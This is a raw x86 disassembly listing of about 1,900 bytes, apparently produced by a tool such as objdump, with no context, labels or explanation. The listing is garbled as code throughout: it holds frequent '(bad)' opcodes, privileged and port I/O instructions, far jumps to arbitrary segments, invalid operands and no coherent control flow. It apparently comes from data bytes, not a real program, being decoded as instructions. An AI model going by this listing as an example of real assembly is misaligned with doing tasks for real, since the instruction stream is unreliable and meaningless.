  41f231:	fst    QWORD PTR [edx]
  41f233:	jmp    0x2128:0x611806b1
  41f23a:	add    eax,DWORD PTR [ecx+0x53df77f8]
  41f240:	dec    ebp
  41f241:	mov    dl,0x38
  41f243:	inc    edx
  41f244:	push   eax
  41f245:	lds    ecx,FWORD PTR cs:[eax+0xc1d5cc7]
  41f24c:	loopne 0x41f2a3
  41f24e:	int    0x22
  41f250:	or     bl,BYTE PTR [esi+0x1c]
  41f253:	sub    cl,BYTE PTR [edi-0x79]
  41f256:	sahf   
  41f257:	pop    ds
  41f258:	mov    WORD PTR [ebx-0x5c],es
  41f25b:	fnstsw WORD PTR [esi+0x39]
  41f25e:	fadd   DWORD PTR [ebx-0x65]
  41f261:	sbb    BYTE PTR [ebx+0x32],0x70
  41f265:	neg    DWORD PTR [edx+0x7902bef0]
  41f26b:	loop   0x41f200
  41f26d:	xchg   cl,bh
  41f26f:	add    DWORD PTR [ebx],0x69
  41f272:	sub    eax,0xaeacdb38
  41f277:	retf   0x1b0
  41f27a:	or     eax,0x14083bfa
  41f27f:	dec    ebx
  41f280:	inc    eax
  41f281:	pop    ebx
  41f282:	or     edx,DWORD PTR [eax-0x2edae159]
  41f288:	jle    0x41f237
  41f28a:	sti    
  41f28b:	bound  esi,QWORD PTR [edi+0x15735745]
  41f291:	or     al,0x89
  41f293:	push   es
  41f294:	or     cl,dh
  41f296:	ret    
  41f297:	les    edx,FWORD PTR [esi]
  41f299:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f29a:	enter  0xbc0d,0xd6
  41f29e:	or     BYTE PTR ss:[edx],al
  41f2a1:	or     DWORD PTR [ebx],0x23cbc47f
  41f2a7:	fwait
  41f2a8:	cs test eax,0xbddb63b
  41f2ae:	(bad)  
  41f2af:	loopne 0x41f238
  41f2b1:	(bad)  
  41f2b2:	fstp   DWORD PTR [esi-0x1d]
  41f2b5:	push   cs
  41f2b6:	push   ss
  41f2b7:	clc    
  41f2b8:	mov    ebp,eax
  41f2ba:	(bad)  
  41f2bb:	call   0x5a4e5d03
  41f2c0:	jns    0x41f25a
  41f2c2:	sbb    BYTE PTR [ecx+edi*8+0x3dccfe5f],bl
  41f2c9:	lds    edi,FWORD PTR [esp+esi*4]
  41f2cc:	ftst   
  41f2ce:	std    
  41f2cf:	popa   
  41f2d0:	and    eax,0xf927c0d3
  41f2d5:	scas   al,BYTE PTR es:[edi]
  41f2d6:	xor    eax,0xe023f3f0
  41f2db:	push   ebp
  41f2dc:	pop    es
  41f2dd:	add    eax,0x67ee3f79
  41f2e2:	enter  0xf6a5,0xe2
  41f2e6:	in     eax,0x78
  41f2e8:	jno    0x41f361
  41f2ea:	adc    al,0xa0
  41f2ec:	or     eax,0xe09f0966
  41f2f1:	xor    al,bh
  41f2f3:	dec    ebp
  41f2f4:	std    
  41f2f5:	loopne 0x41f2f4
  41f2f7:	sahf   
  41f2f8:	add    al,0x6a
  41f2fa:	mov    esi,0xaf3cd7cf
  41f2ff:	jnp    0x41f2d6
  41f301:	xor    eax,0xcacf1cb4
  41f306:	(bad)  
  41f307:	mov    ds,WORD PTR [esi+0x32e53dea]
  41f30d:	(bad)  
  41f30e:	into   
  41f30f:	repnz in al,0xbc
  41f312:	adc    al,0x1f
  41f314:	rcl    DWORD PTR [edi-0x73],cl
  41f317:	stos   DWORD PTR es:[edi],eax
  41f318:	dec    ebp
  41f319:	xor    eax,0x38a62008
  41f31e:	add    BYTE PTR [eax],al
  41f320:	add    BYTE PTR [eax],al
  41f322:	sub    esp,DWORD PTR [ecx-0x934ebbd]
  41f328:	jg     0x41f2e9
  41f32a:	test   ch,ch
  41f32c:	out    dx,al
  41f32d:	add    BYTE PTR [ebp+0x5e261bf],0x6e
  41f334:	add    DWORD PTR [eax],eax
  41f336:	hlt    
  41f337:	add    al,0x0
  41f339:	add    BYTE PTR [edi-0x33],ch
  41f33c:	sub    ebx,DWORD PTR [ebx-0x76]
  41f33f:	fwait
  41f340:	jp     0x41f388
  41f342:	mov    edi,0x6d4e47f6
  41f347:	outs   dx,WORD PTR ds:[esi]
  41f349:	inc    ecx
  41f34a:	(bad)  
  41f34b:	pop    esi
  41f34c:	shr    DWORD PTR fs:[edx-0x61576bcd],cl
  41f353:	dec    ecx
  41f354:	push   0xffffff99
  41f356:	jno    0x41f325
  41f358:	or     ebx,DWORD PTR [ecx-0x36]
  41f35b:	xchg   ebp,eax
  41f35c:	loop   0x41f306
  41f35e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f35f:	sub    dl,BYTE PTR ds:[ebx+eiz*4]
  41f363:	test   DWORD PTR [eax+0x2b],ecx
  41f366:	pusha  
  41f367:	adc    al,0x11
  41f369:	add    ch,cl
  41f36b:	cld    
  41f36c:	outs   dx,BYTE PTR ds:[esi]
  41f36d:	and    eax,DWORD PTR [eax-0x629ec33d]
  41f373:	dec    eax
  41f374:	fdivr  QWORD PTR [edi-0x64]
  41f377:	les    edx,FWORD PTR [edx+0x1bb07431]
  41f37d:	stos   BYTE PTR es:[edi],al
  41f37e:	mov    ?,WORD PTR [edx-0xebbaa53]
  41f384:	dec    esi
  41f385:	xor    BYTE PTR [ecx+edi*8],dl
  41f388:	push   ebx
  41f389:	mov    esp,0xf1f61b3e
  41f38e:	or     al,0xac
  41f390:	or     ah,0xbd
  41f393:	enter  0x92ea,0x2d
  41f397:	lds    ecx,FWORD PTR [edx]
  41f399:	aaa    
  41f39a:	std    
  41f39b:	xchg   edi,eax
  41f39c:	dec    eax
  41f39d:	(bad)  
  41f39e:	mov    es:0x98bde2fa,eax
  41f3a4:	fldenv [esp+eiz*4+0x56fac7ac]
  41f3ab:	shl    DWORD PTR [ecx+0x63],1
  41f3ae:	dec    edx
  41f3af:	mov    edi,0x1bff0bca
  41f3b4:	pop    ecx
  41f3b5:	lods   eax,DWORD PTR ds:[esi]
  41f3b6:	xchg   edx,eax
  41f3b7:	and    cl,dl
  41f3b9:	outs   dx,BYTE PTR ds:[esi]
  41f3ba:	or     al,0xa1
  41f3bc:	or     DWORD PTR [eax],edi
  41f3be:	dec    edx
  41f3bf:	ret    0x7766
  41f3c2:	popa   
  41f3c3:	(bad)  
  41f3c4:	jnp    0x41f42b
  41f3c6:	push   edx
  41f3c7:	hlt    
  41f3c8:	cli    
  41f3c9:	mov    bl,0xc9
  41f3cb:	jecxz  0x41f42e
  41f3cd:	fstp   TBYTE PTR [ebp-0x7db6ad19]
  41f3d3:	mov    ds:0x94bd0fc4,al
  41f3d8:	add    al,0x25
  41f3da:	dec    esp
  41f3db:	mov    al,0x8b
  41f3dd:	xchg   ecx,eax
  41f3de:	xchg   esp,eax
  41f3df:	jnp    0x41f3b3
  41f3e1:	sub    ebx,esi
  41f3e3:	inc    ebp
  41f3e4:	pop    es
  41f3e5:	not    DWORD PTR [ecx]
  41f3e7:	pop    edi
  41f3e8:	inc    esi
  41f3e9:	dec    esp
  41f3ea:	xor    al,0xde
  41f3ec:	lods   al,BYTE PTR ds:[esi]
  41f3ed:	xchg   ebp,eax
  41f3ee:	mov    edi,0xa5f758bd
  41f3f3:	push   esi
  41f3f4:	(bad)  
  41f3f5:	push   edi
  41f3f6:	push   ebp
  41f3f7:	xchg   esi,eax
  41f3f8:	xchg   esi,eax
  41f3f9:	xor    BYTE PTR [ebx],ch
  41f3fb:	and    edi,esi
  41f3fd:	ficom  WORD PTR [edx+0x6b818ad]
  41f403:	mov    esi,0x6dad6dbb
  41f408:	mov    eax,ds:0x62461403
  41f40d:	rep lods al,BYTE PTR ds:[esi]
  41f40f:	sbb    al,cl
  41f411:	paddsw mm7,mm2
  41f414:	mov    BYTE PTR [ecx+0x58],ah
  41f417:	aas    
  41f418:	mov    edi,0x496235c2
  41f41d:	jns    0x41f3a0
  41f41f:	in     al,dx
  41f420:	dec    esi
  41f421:	fwait
  41f422:	int    0x79
  41f424:	sub    al,0xae
  41f426:	mov    ds:0xa89e7ce9,eax
  41f42b:	pusha  
  41f42c:	pop    ss
  41f42d:	push   es
  41f42e:	or     esp,ebx
  41f430:	adc    ebp,DWORD PTR [ebp+0x30a25dc1]
  41f436:	pop    ebx
  41f437:	pusha  
  41f438:	addr16 out 0x71,al
  41f43b:	retf   0x4abc
  41f43e:	out    dx,eax
  41f43f:	in     al,dx
  41f440:	xor    esi,DWORD PTR [edi+0x72582e1b]
  41f446:	ficomp WORD PTR [ebx]
  41f448:	push   edx
  41f449:	mov    bh,0x58
  41f44b:	xchg   esp,eax
  41f44c:	icebp  
  41f44d:	and    eax,0x3871a4bd
  41f452:	adc    al,0xc3
  41f454:	sbb    eax,0x139785c8
  41f459:	fnstsw WORD PTR [eax+0x42]
  41f45c:	hlt    
  41f45d:	fidivr DWORD PTR [eax+ecx*4-0x22]
  41f461:	stc    
  41f462:	and    BYTE PTR [edx+eiz*4+0x586d95fe],dl
  41f469:	cli    
  41f46a:	arpl   WORD PTR [esi-0x6c],bx
  41f46d:	(bad)  
  41f46e:	es or  dl,bh
  41f471:	dec    ebp
  41f472:	retf   0x868b
  41f475:	pushf  
  41f476:	lock inc ecx
  41f478:	inc    esi
  41f479:	sahf   
  41f47a:	imul   ecx,DWORD PTR [ecx-0x24c79952],0x7cd23f9a
  41f484:	dec    ebx
  41f485:	jne    0x41f464
  41f487:	and    al,0x57
  41f489:	sar    DWORD PTR [eax-0x67],0x10
  41f48d:	outs   dx,BYTE PTR ds:[esi]
  41f48e:	rcl    ebp,0x64
  41f491:	sbb    ch,BYTE PTR ds:0x34fe0b3c
  41f497:	push   esi
  41f498:	cwde   
  41f499:	mov    ?,WORD PTR [ebp+0x4a4890c4]
  41f49f:	pop    esi
  41f4a0:	push   0xd56712ac
  41f4a5:	cmp    edi,esi
  41f4a7:	sahf   
  41f4a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f4a9:	call   0xed3c2c4d
  41f4ae:	add    esp,DWORD PTR [esi]
  41f4b0:	ds jne 0x41f466
  41f4b3:	add    esp,DWORD PTR [edx-0x32]
  41f4b6:	push   esp
  41f4b7:	push   edx
  41f4b8:	scas   eax,DWORD PTR es:[edi]
  41f4b9:	bnd jno 0x41f532
  41f4bc:	fcomp  QWORD PTR [edi]
  41f4be:	fwait
  41f4bf:	mov    ebx,0x954a36fe
  41f4c4:	and    BYTE PTR [esi],bh
  41f4c6:	add    eax,0xd2d021b7
  41f4cb:	mov    edx,0x3a4fa79b
  41f4d0:	int3   
  41f4d1:	add    eax,0xad6f8857
  41f4d6:	(bad)  
  41f4d7:	xor    ebx,ecx
  41f4d9:	dec    eax
  41f4da:	and    al,0x84
  41f4dc:	add    edi,DWORD PTR [ebx-0x171f1cb0]
  41f4e2:	add    al,0x92
  41f4e4:	loope  0x41f521
  41f4e6:	or     esi,edx
  41f4e8:	cmc    
  41f4e9:	fwait
  41f4ea:	cmp    eax,DWORD PTR [ebx]
  41f4ec:	lahf   
  41f4ed:	fbstp  TBYTE PTR [edi+0x39]
  41f4f0:	ins    BYTE PTR es:[edi],dx
  41f4f1:	or     cl,al
  41f4f3:	dec    ebp
  41f4f4:	and    al,0xd5
  41f4f6:	icebp  
  41f4f7:	call   0xbf842d75
  41f4fc:	int    0x80
  41f4fe:	aas    
  41f4ff:	mov    BYTE PTR [ebx-0x78aa5d59],dh
  41f505:	push   ds
  41f506:	out    dx,eax
  41f507:	cmp    DWORD PTR [edx+0x6e],0x3
  41f50b:	out    0xce,eax
  41f50d:	and    dl,cl
  41f50f:	cmp    cl,BYTE PTR [eax]
  41f511:	cmp    esi,DWORD PTR [edi-0x340cb515]
  41f517:	pop    ebp
  41f518:	adc    al,0x12
  41f51a:	jae    0x41f548
  41f51c:	jmp    0x3d20e37
  41f521:	scas   al,BYTE PTR es:[edi]
  41f522:	fdiv   st(4),st
  41f524:	fidivr DWORD PTR [ebp+0x6e9f599c]
  41f52a:	(bad)
  41f52e:	fidiv  WORD PTR [edx+0x44764c9]
  41f534:	ret    
  41f535:	sub    BYTE PTR [edi+edi*8-0x45],ah
  41f539:	sti    
  41f53a:	push   ss
  41f53b:	cmp    eax,0xf07ad4b0
  41f540:	cwde   
  41f541:	jns    0x41f59d
  41f543:	pop    esi
  41f544:	mov    ebx,ebp
  41f546:	fwait
  41f547:	sub    eax,0xf96ee711
  41f54c:	retf   0xb51b
  41f54f:	dec    ecx
  41f550:	xor    al,0x86
  41f552:	jl     0x41f5b8
  41f554:	ins    DWORD PTR es:[edi],dx
  41f555:	push   ebx
  41f556:	adc    BYTE PTR [ebx+0x3b],cl
  41f559:	mov    BYTE PTR [edx],bh
  41f55b:	scas   eax,DWORD PTR es:[edi]
  41f55c:	arpl   WORD PTR [edx],bp
  41f55e:	mov    dl,BYTE PTR [ebp-0x518bd123]
  41f564:	lods   al,BYTE PTR ds:[esi]
  41f565:	jbe    0x41f503
  41f567:	jecxz  0x41f5b2
  41f569:	nop
  41f56a:	cmp    bh,BYTE PTR [ebx]
  41f56c:	mov    WORD PTR [eax-0x178e4a34],fs
  41f572:	sub    BYTE PTR [eax+0x51e26d3e],0xdd
  41f579:	mov    bh,0x14
  41f57b:	jle    0x41f5cd
  41f57d:	xchg   edx,eax
  41f57e:	lahf   
  41f57f:	mov    al,BYTE PTR [edx-0x39eb9989]
  41f585:	daa    
  41f586:	sti    
  41f587:	repz popa 
  41f589:	push   ebx
  41f58a:	fdiv   QWORD PTR [esi-0x4d5da24f]
  41f590:	or     eax,0x3bc716b4
  41f595:	mov    BYTE PTR [edx-0x1f],al
  41f598:	into   
  41f599:	(bad)  
  41f59a:	(bad)  [eax]
  41f59c:	cmp    al,0xba
  41f59e:	ror    BYTE PTR [ecx-0x41],1
  41f5a1:	jo     0x41f583
  41f5a3:	(bad)  
  41f5a4:	mov    dh,0xd
  41f5a6:	std    
  41f5a7:	ja     0x41f536
  41f5a9:	cmp    eax,0x21811cde
  41f5ae:	mov    bl,0xb4
  41f5b0:	(bad)  
  41f5b1:	or     ch,BYTE PTR [ebx-0x50c6a876]
  41f5b7:	dec    ebx
  41f5b8:	leave  
  41f5b9:	into   
  41f5ba:	pushf  
  41f5bb:	pop    esp
  41f5bc:	and    ebx,0x41990b62
  41f5c2:	pop    es
  41f5c3:	loopne 0x41f5e0
  41f5c5:	test   BYTE PTR [esi-0x3],bl
  41f5c8:	cmp    BYTE PTR [edx-0x21],cl
  41f5cb:	push   ss
  41f5cc:	adc    esi,esi
  41f5ce:	mov    al,cl
  41f5d0:	(bad)  
  41f5d1:	(bad)  
  41f5d2:	stc    
  41f5d3:	cmc    
  41f5d4:	leave  
  41f5d5:	push   esi
  41f5d6:	push   ebx
  41f5d7:	test   BYTE PTR cs:[ecx],ah
  41f5da:	loop   0x41f61d
  41f5dc:	out    0x6b,al
  41f5de:	push   ss
  41f5df:	aas    
  41f5e0:	xor    eax,0xf7ef22b
  41f5e5:	sub    DWORD PTR [esi+0xdd6a265],edi
  41f5eb:	pushf  
  41f5ec:	jl     0x41f61c
  41f5ee:	push   ebp
  41f5ef:	shl    DWORD PTR [edi+0x69],0x38
  41f5f3:	sti    
  41f5f4:	cmp    DWORD PTR [esi],0x6d8cf8b0
  41f5fa:	sbb    eax,0x19bf6ff7
  41f5ff:	sbb    ebp,DWORD PTR [esi-0x2a64160c]
  41f605:	mov    esi,0x81002d8b
  41f60a:	inc    ebx
  41f60b:	cmp    edx,DWORD PTR [esi]
  41f60d:	adc    al,0xeb
  41f60f:	jmp    0x41f63e
  41f611:	loope  0x41f593
  41f613:	les    ebx,FWORD PTR [esi-0x7f7b6852]
  41f619:	aam    0xa8
  41f61b:	cmp    edi,ebp
  41f61d:	push   ebx
  41f61e:	sub    bh,BYTE PTR [ebx-0x171be2c7]
  41f624:	or     BYTE PTR [ebx],ah
  41f626:	lahf   
  41f627:	mov    BYTE PTR [eax-0x34cfbdd7],ch
  41f62d:	or     eax,0x8c518e26
  41f632:	(bad)  
  41f633:	aad    0x2a
  41f635:	aam    0x2e
  41f637:	inc    ecx
  41f638:	pop    ebp
  41f639:	inc    esi
  41f63a:	aas    
  41f63b:	cmp    al,0x3d
  41f63d:	cvtpi2ps xmm1,QWORD PTR [edi+0x59]
  41f641:	addr16 jl 0x41f67b
  41f644:	addr16 lock (bad) 
  41f647:	sbb    al,0xff
  41f649:	fs jecxz 0x41f625
  41f64c:	sub    bl,al
  41f64e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f64f:	out    0xe2,eax
  41f651:	sbb    eax,0xc2b30cb0
  41f656:	daa    
  41f657:	ret    0xce67
  41f65a:	pushf  
  41f65b:	xchg   ecx,eax
  41f65c:	and    DWORD PTR [esp+edx*4-0x44],edi
  41f660:	xchg   ebp,eax
  41f661:	push   edx
  41f662:	push   esi
  41f663:	pop    es
  41f664:	repz ds retf 
  41f667:	and    eax,0xb807f6d5
  41f66c:	out    dx,eax
  41f66d:	and    cl,BYTE PTR [edx]
  41f66f:	ret    
  41f670:	or     BYTE PTR [ecx],dh
  41f672:	fld    st(1)
  41f674:	pop    eax
  41f675:	sbb    DWORD PTR [esi],edx
  41f677:	mov    eax,0xb5a67368
  41f67c:	fiadd  DWORD PTR [ebp-0x5c]
  41f67f:	cmc    
  41f680:	mov    dh,0xd3
  41f682:	(bad)  [ecx-0x7c]
  41f685:	mov    ecx,0xd2676491
  41f68a:	jmp    0x9b83782
  41f68f:	jg     0x41f652
  41f691:	gs xor al,0x0
  41f694:	push   ss
  41f695:	or     BYTE PTR [eax-0x53af5eb4],cl
  41f69b:	mov    eax,0xba380ad7
  41f6a0:	adc    ah,BYTE PTR [ecx-0x7c]
  41f6a3:	lods   eax,DWORD PTR ds:[esi]
  41f6a4:	jnp    0x41f637
  41f6a6:	nop
  41f6a7:	or     eax,0x93c06a9b
  41f6ac:	inc    edi
  41f6ad:	sbb    BYTE PTR [ecx+0x79],bh
  41f6b0:	mov    ch,0xd8
  41f6b2:	mov    BYTE PTR [ebx],dh
  41f6b4:	imul   esi,DWORD PTR [ebx-0x69],0x49
  41f6b8:	dec    ebp
  41f6b9:	dec    ecx
  41f6ba:	push   ebp
  41f6bb:	sahf   
  41f6bc:	repz cmp dh,BYTE PTR [eax-0x2a768618]
  41f6c3:	fild   QWORD PTR [ecx]
  41f6c5:	sbb    edx,esp
  41f6c7:	add    BYTE PTR [ebp+esi*8-0x7c],ch
  41f6cb:	or     cl,BYTE PTR [edi-0x623cfe21]
  41f6d1:	or     ah,al
  41f6d3:	bts    DWORD PTR [eax+0x16],edx
  41f6d7:	push   es
  41f6d8:	sbb    ebp,edx
  41f6da:	push   edi
  41f6db:	leave  
  41f6dc:	ins    BYTE PTR es:[edi],dx
  41f6dd:	pop    ss
  41f6de:	call   0xc7fc0573
  41f6e3:	std    
  41f6e4:	das    
  41f6e5:	push   ebp
  41f6e6:	jge    0x41f71a
  41f6e8:	fimul  WORD PTR [ecx+0x2a]
  41f6eb:	add    DWORD PTR [esi-0x172c8dee],0x1f
  41f6f2:	(bad)  
  41f6f3:	leave  
  41f6f4:	das    
  41f6f5:	mov    ch,bh
  41f6f7:	xchg   BYTE PTR [eax+0x66],dl
  41f6fa:	or     eax,0xb59f8ac9
  41f6ff:	xchg   edx,eax
  41f700:	jmp    0xd32b:0x841c9093
  41f707:	test   esp,ebx
  41f709:	shl    BYTE PTR [edx+0x58],1
  41f70c:	mov    DWORD PTR [ebp-0x73],ebp
  41f70f:	mov    ebp,0x92961687
  41f714:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f715:	retf   0x7c9
  41f718:	pushf  
  41f719:	add    DWORD PTR [ebx+0x45],eax
  41f71c:	inc    eax
  41f71d:	je     0x41f752
  41f71f:	stos   BYTE PTR es:[edi],al
  41f720:	clc    
  41f721:	mov    esi,0x7c1dccbe
  41f726:	arpl   WORD PTR [esi+0x765771ca],dx
  41f72c:	cmp    ah,ah
  41f72e:	jmp    0xd420:0x1a4b0953
  41f735:	xor    DWORD PTR [ebx-0x6],esp
  41f738:	js     0x41f705
  41f73a:	lods   eax,DWORD PTR ds:[esi]
  41f73b:	and    al,0x2
  41f73d:	cld    
  41f73e:	lock mov ecx,0x8427e11
  41f744:	jmp    0x41f75e
  41f746:	jmp    0xb6ea:0xc7ccf2c0
  41f74d:	jecxz  0x41f771
  41f74f:	xchg   ecx,eax
  41f750:	lock je 0x41f73d
  41f753:	pop    ecx
  41f754:	arpl   WORD PTR [edi+0x61bddc31],cx
  41f75a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f75b:	mov    dl,0xf5
  41f75d:	mov    gs,WORD PTR [esi]
  41f75f:	push   eax
  41f760:	jno    0x41f6ee
  41f762:	out    0xa4,eax
  41f764:	aad    0x28
  41f766:	and    al,0x53
  41f768:	pop    ecx
  41f769:	push   edi
  41f76a:	mov    bl,ch
  41f76c:	mov    BYTE PTR [ebx],0x15
  41f76f:	push   cs
  41f770:	pop    eax
  41f771:	and    DWORD PTR [eax+0x37],ebp
  41f774:	(bad)  [ebx]
  41f776:	cmc    
  41f777:	xchg   ebx,eax
  41f778:	sahf   
  41f779:	push   esp
  41f77a:	dec    esp
  41f77b:	fcomp  DWORD PTR [eax+0x11]
  41f77e:	jno    0x41f701
  41f780:	pop    edi
  41f781:	or     esp,DWORD PTR [edi+0x50]
  41f784:	mov    ds:0x50c861d9,eax
  41f789:	cli    
  41f78a:	pushf  
  41f78b:	out    dx,al
  41f78c:	les    edi,FWORD PTR ds:0x4421ecce
  41f792:	je     0x41f7e4
  41f794:	inc    ecx
  41f795:	mov    ah,0xda
  41f797:	cmp    al,0xe
  41f799:	pop    edi
  41f79a:	dec    eax
  41f79b:	sub    al,0xb2
  41f79d:	mov    esi,0xf0ef23fe
  41f7a2:	dec    ecx
  41f7a3:	jno    0x41f759
  41f7a5:	sub    ah,BYTE PTR [ebx-0x80]
  41f7a8:	nop
  41f7a9:	mov    ds:0x2b370590,eax
  41f7ae:	mov    ebx,DWORD PTR [ebx+0x7695abcc]
  41f7b4:	xchg   edx,eax
  41f7b5:	jne    0x41f801
  41f7b7:	test   DWORD PTR [ecx],ebp
  41f7b9:	jb     0x41f7da
  41f7bb:	xlat   BYTE PTR ds:[ebx]
  41f7bc:	xchg   al,dl
  41f7be:	sub    ch,BYTE PTR [eax+0x47]
  41f7c1:	sar    DWORD PTR [edx-0x53c000f],cl
  41f7c7:	pushf  
  41f7c8:	mov    al,0x3
  41f7ca:	pop    edx
  41f7cb:	js     0x41f767
  41f7cd:	xchg   edi,eax
  41f7ce:	jno    0x41f81a
  41f7d0:	es push cs
  41f7d2:	add    dh,BYTE PTR [edx]
  41f7d4:	fldcw  WORD PTR [esi]
  41f7d6:	(bad)  
  41f7d7:	clc    
  41f7d8:	or     dl,BYTE PTR [esi+eax*8]
  41f7db:	popw   es
  41f7dd:	pop    ecx
  41f7de:	xor    esi,ebx
  41f7e0:	retf   0xd837
  41f7e3:	and    edi,DWORD PTR [ebp+0x137b032f]
  41f7e9:	test   BYTE PTR [bp-0x746c],ch
  41f7ee:	pusha  
  41f7ef:	cmp    al,0xda
  41f7f1:	scas   eax,DWORD PTR es:[edi]
  41f7f2:	(bad)  
  41f7f3:	cvttps2pi mm3,QWORD PTR [edi]
  41f7f6:	jle    0x41f861
  41f7f8:	push   ecx
  41f7f9:	popf   
  41f7fa:	sbb    eax,0x29b6da46
  41f7ff:	in     al,dx
  41f800:	mov    ebx,0x1e4da027
  41f805:	(bad)
  41f809:	and    eax,0x5f94296d
  41f80e:	and    DWORD PTR [ecx],esp
  41f810:	adc    BYTE PTR [esi+0x71debd11],0xda
  41f817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f818:	add    al,0xa8
  41f81a:	out    0x63,eax
  41f81c:	add    eax,0xc3710c68
  41f821:	xchg   BYTE PTR [edx+0x54542168],dl
  41f827:	call   0x33d1dfd7
  41f82c:	pop    ecx
  41f82d:	add    BYTE PTR [bx+si],al
  41f830:	add    BYTE PTR [eax],al
  41f832:	dec    eax
  41f833:	mul    BYTE PTR fs:[eax-0x2]
  41f837:	repnz fisubr WORD PTR [ecx+eiz*8-0x64]
  41f83c:	out    0x52,eax
  41f83e:	paddusw mm6,QWORD PTR [edx+0x172f9d3]
  41f845:	add    ah,dh
  41f847:	add    al,0x0
  41f849:	add    BYTE PTR [ebp+0x59],dl
  41f84c:	dec    ecx
  41f84d:	and    bl,BYTE PTR [esi-0xe]
  41f850:	fwait
  41f851:	loope  0x41f8c5
  41f853:	and    BYTE PTR [ebp-0x4],dl
  41f856:	sbb    BYTE PTR [edx+0x46],bh
  41f859:	mov    esi,0x5b3a0f74
  41f85e:	sbb    eax,0xc1457502
  41f863:	lods   al,BYTE PTR ds:[esi]
  41f864:	(bad)  
  41f865:	in     al,dx
  41f866:	dec    edi
  41f867:	xchg   esi,eax
  41f868:	pop    ecx
  41f869:	adc    bh,al
  41f86b:	inc    esi
  41f86c:	jg     0x41f837
  41f86e:	xor    eax,0x82a2b00c
  41f873:	mov    dl,0xf3
  41f875:	stos   DWORD PTR es:[edi],eax
  41f876:	and    al,0xc3
  41f878:	inc    ebp
  41f879:	dec    edx
  41f87a:	addr16 mov al,ds:0xf7e2
  41f87e:	inc    ebp
  41f87f:	adc    BYTE PTR [ebx+0x3796bc43],ch
  41f885:	jecxz  0x41f895
  41f887:	scas   al,BYTE PTR es:[edi]
  41f888:	sub    cl,cl
  41f88a:	xor    BYTE PTR [ebp+0x49],bl
  41f88d:	ret    0xd6bb
  41f890:	add    esp,DWORD PTR [esi-0x6e]
  41f893:	test   al,0x73
  41f895:	gs loopne 0x41f90d
  41f898:	mov    ds:0x18f7dc59,al
  41f89d:	test   DWORD PTR [edx+0x63],0xe2e1bbe6
  41f8a4:	push   ds
  41f8a5:	xchg   edx,eax
  41f8a6:	int    0x62
  41f8a8:	push   ebx
  41f8a9:	sub    eax,0xf9ea8d6d
  41f8ae:	lds    ecx,FWORD PTR [esi+0x54]
  41f8b1:	dec    esp
  41f8b2:	fimul  WORD PTR [esi+0x61]
  41f8b5:	xlat   BYTE PTR ds:[ebx]
  41f8b6:	and    DWORD PTR [ebx+0x5e2b2466],edx
  41f8bc:	or     DWORD PTR [edi+eax*8],ebp
  41f8bf:	aad    0x33
  41f8c1:	sbb    esp,eax
  41f8c3:	mov    al,ds:0xa62e8581
  41f8c8:	jbe    0x41f916
  41f8ca:	dec    ebx
  41f8cb:	out    0xa4,eax
  41f8cd:	jecxz  0x41f8ea
  41f8cf:	sub    eax,0xc5813ae2
  41f8d4:	aaa    
  41f8d5:	pop    es
  41f8d6:	jbe    0x41f94a
  41f8d8:	or     DWORD PTR [edx-0x38],esp
  41f8db:	sahf   
  41f8dc:	push   ecx
  41f8dd:	daa    
  41f8de:	adc    al,0xe3
  41f8e0:	add    al,0x9f
  41f8e2:	add    DWORD PTR [edx-0x7a],esp
  41f8e5:	out    dx,eax
  41f8e6:	je     0x41f902
  41f8e8:	jmp    0x8934:0x73498b92
  41f8ef:	shl    DWORD PTR [ebx-0x73326a69],0x3
  41f8f6:	pop    es
  41f8f7:	sbb    BYTE PTR [esi],0xc9
  41f8fa:	inc    ebp
  41f8fb:	int3   
  41f8fc:	cli    
  41f8fd:	mov    esp,DWORD PTR [esi+0x4597d00f]
  41f903:	adc    DWORD PTR [ebx],ecx
  41f905:	xchg   edi,eax
  41f906:	jmp    0x25705876
  41f90b:	jp     0x41f8b6
  41f90d:	sbb    al,0x4f
  41f90f:	cs sub eax,0x2f65b47f
  41f915:	push   edx
  41f916:	jnp    0x41f93d
  41f918:	mov    WORD PTR [edi+0x45],es
  41f91b:	sub    esp,0x3
  41f91e:	retf   0xd1ef
  41f921:	or     esi,edi
  41f923:	in     eax,0xdd
  41f925:	aam    0x2b
  41f927:	mov    ah,BYTE PTR [edx-0x63]
  41f92a:	ret    
  41f92b:	ja     0x41f8bc
  41f92d:	call   0x73ac:0x354dd098
  41f934:	sbb    al,0xca
  41f936:	dec    ecx
  41f937:	mov    ds:0x16d27bdd,al
  41f93c:	adc    al,0xa5
  41f93e:	or     ebx,DWORD PTR [eax-0x6e]
  41f941:	into   
  41f942:	xor    DWORD PTR [ecx],0xfffffffb
  41f945:	pop    esp
  41f946:	aas    
  41f947:	sbb    eax,0xd5ef5e22
  41f94c:	jnp    0x41f915
  41f94e:	pop    edx
  41f94f:	jb     0x41f94b
  41f951:	add    al,0xb0
  41f953:	xor    BYTE PTR [edi-0x7],ah
  41f956:	or     ebx,DWORD PTR [ecx+0x1b]
  41f959:	cli    
  41f95a:	mov    esp,0xc54e39ba
  41f95f:	mov    ch,0xbd
  41f961:	push   ds
  41f962:	mov    cl,0x80
  41f964:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f965:	push   eax
  41f966:	test   bh,cl
  41f968:	sti    
  41f969:	xchg   al,dl
  41f96b:	sbb    ebp,eax
  41f96d:	(bad)  
  41f96f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f970:	push   ds
  41f971:	addr16 xor eax,0x47b6fd3
  41f977:	loop   0x41f92d
  41f979:	push   ecx
  41f97a:	fistp  QWORD PTR [ebx-0x21]
  41f97d:	dec    esi
  41f97e:	fdivr  st(7),st
  41f980:	fdivr  st,st(0)
  41f982:	cmc    
  41f983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f984:	out    dx,eax
  41f985:	inc    ecx
  41f986:	push   es
  41f987:	ins    DWORD PTR es:[edi],dx
  41f988:	lahf   
  41f989:	mov    eax,edi
  41f98b:	inc    ecx
  41f98c:	push   ebp
  41f98d:	loopne 0x41f93d
  41f98f:	xchg   ebx,eax
  41f990:	repz add eax,esp
  41f993:	push   ebx
  41f994:	es push ecx
